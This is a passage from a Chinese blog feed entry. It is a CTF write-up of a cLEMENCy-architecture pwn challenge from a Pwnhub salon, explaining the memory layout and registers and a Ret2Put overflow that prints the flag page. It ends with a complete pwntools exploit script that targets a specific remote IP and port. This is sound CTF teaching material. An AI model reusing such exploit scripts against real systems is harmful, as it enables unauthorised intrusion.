memory.”</p></blockquote></li><li><p>内存布局：如下图所示。漏洞利用的目标即把Flag页面开始的一段内存，即flag打印出来。所以说只需要任意地址读就可以了。</p><p> <img src="https://ws3.sinaimg.cn/large/006tNc79gy1fija68reuoj310y0hkn1b.jpg" alt=""></p></li><li><p>指令集：cLEMENCy是RISC，不过最长54bit，指令集和arm有点类似；</p></li><li><p>寄存器：共31个寄存器，<code>R0</code>一般用于<code>param 1</code>和<code>ret value</code>，<code>ST</code>表示栈，<code>RA</code>表示返回地址。</p></li><li><p>栈调用：栈有两个增长方向；对栈的操作往往通过<code>STT(Store Tri)</code>指令实现。<code>STTm</code>指令有三种，其中0，1，2分别表示内容存入memory之后<code>rB</code>操作数是增加还是减少，从而表示栈的增长方向。</p></li></ol><p>除此之外，比赛中使用的bianry使用了<code>neatlibc</code>，但为了方便模拟器对io和内存管理进行了一些修改。</p><h2 id="0x02-漏洞利用：Ret2Put"><a href="#0x02-漏洞利用：Ret2Put" class="headerlink" title="0x02 漏洞利用：Ret2Put"></a>0x02 漏洞利用：Ret2Put</h2><p>既然是2个小时的CTF，大佬们出题肯定是放足了水233。用IDA大概分析一下，可以发现这是一个简单的伪<code>&quot;Base64&quot;</code>。</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijbgetydzj312w0ocdoa.jpg" alt=""></p><blockquote><p>这里用的是<code>Tea Deliverers</code>在比赛时使用的<code>IDA Processor</code>（膜LYM和Explorer和GYC等大佬）。PPP在赛后也放出了他们比赛时使用的<a href="https://github.com/pwning/defcon25-public" target="_blank" rel="noopener">Utils</a>。</p></blockquote><p>其中主要的函数<code>read_string</code>:输入一个9bit表示的字符串（交互也全部都是基于9bit），之后会以三字节为单位，转成以三字节为单位的值。如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;AAA\n&apos; -&gt; 0010101</span><br></pre></td></tr></table></figure></p><p>在调用这个函数时，传入的len过长，于是可以溢出上一个函数的返回地址，因此我们可以直接<code>Ret2put</code>，即修改返回地址和参数为<code>Put</code>函数和<code>flag page</code>的地址，即可打印出flag。</p><p>观察main_func返回处，<code>LDT R28-RA, [R28 + 0]</code>将R28, ST, RA三个寄存器赋值，是可控的，而puts的参数R0也通过<code>ad. R0, R28, R27</code>控制。</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fijbr5ncb1j30kx0euq7p.jpg" alt=""><br>A</p><p>于是构造对应值即可。</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijc2pzv9uj30iq068gnz.jpg" alt=""></p><p>还有一点是，ST要填上一个合法值，否则<code>puts</code>时会<code>crash</code>。但是程序是没有随机化的，所以每次运行都一样。这也导致了比赛时”抄作业(直接重放)”异常方便。</p><p>最终代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p27</span><span class="params">(bit24)</span>:</span></span><br><span class="line">    r = bin(bit24)[<span class="number">2</span>:].rjust(<span class="number">27</span>, <span class="string">'0'</span>)</span><br><span class="line">    r = r[<span class="number">9</span>:<span class="number">18</span>] + r[<span class="number">0</span>:<span class="number">9</span>] + r[<span class="number">18</span>:<span class="number">27</span>]</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sb8tosb9</span><span class="params">(payload)</span>:</span></span><br><span class="line">    stream = <span class="string">''</span>.join(bin(ord(x))[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> payload)</span><br><span class="line">    pad = len(stream) % <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> pad != <span class="number">0</span>:</span><br><span class="line">        length = len(stream) + (<span class="number">8</span> - pad)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = len(stream)</span><br><span class="line">    stream = stream.ljust(length, <span class="string">'0'</span>)</span><br><span class="line">    payload9 = <span class="string">''</span>.join(</span><br><span class="line">        chr(int(stream[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(stream), <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> payload9</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sb9tosb8</span><span class="params">(payload)</span>:</span></span><br><span class="line">    stream = <span class="string">''</span>.join(bin(ord(x))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> payload)</span><br><span class="line">    length = (len(stream) / <span class="number">9</span>) * <span class="number">9</span></span><br><span class="line">    stream = stream[:length]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(</span><br><span class="line">        chr(int(stream[i:i + <span class="number">9</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(stream), <span class="number">9</span>))</span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    alphabet += (chr(i + ord(<span class="string">'A'</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    alphabet += (chr(i + ord(<span class="string">'a'</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    alphabet += (chr(i + ord(<span class="string">'0'</span>)))</span><br><span class="line">alphabet += <span class="string">'+/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conventer</span><span class="params">(bit18)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[:<span class="number">6</span>],<span class="number">2</span>)]</span><br><span class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[<span class="number">6</span>:<span class="number">12</span>],<span class="number">2</span>)]</span><br><span class="line">    res += alphabet[int(<span class="string">"0b"</span> + bit18[<span class="number">-6</span>:],<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"54.223.103.62"</span>,<span class="number">10000</span>)</span><br><span class="line">flag_addr = <span class="number">0x4010000</span> + <span class="number">0x21</span></span><br><span class="line">pc_addr = <span class="number">0x645F</span></span><br><span class="line">newpld = <span class="number">11</span> * p27(<span class="number">0x414141</span>) + p27(flag_addr) + p27(<span class="number">0x3fffbc7</span>) + p27(pc_addr)</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(newpld) / <span class="number">18</span>):</span><br><span class="line">    payload += conventer(newpld[i*<span class="number">18</span>:(i+<span class="number">1</span>)*<span class="number">18</span>])</span><br><span class="line">p.send(sb8tosb9(payload + <span class="string">'\n'</span>))</span><br><span class="line">p.recvn(<span class="number">0x2d</span>)</span><br><span class="line">data = sb9tosb8(p.recvall(timeout = <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;8月12日Pwnhub第一次沙龙，心想到要和一众大佬面基，心情异常激动，于是攥着讨来的邀请函，冒着12级大雨，满心欢喜的赶到了五环的小别墅。&lt;/p&gt;
&lt;p&gt;上午的议题干货满满，有冠城大佬，360小姐姐和青博学弟flyyy的分享，中午的&lt;strong&gt;烧烤 + 德州扑克&lt;/s
      
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
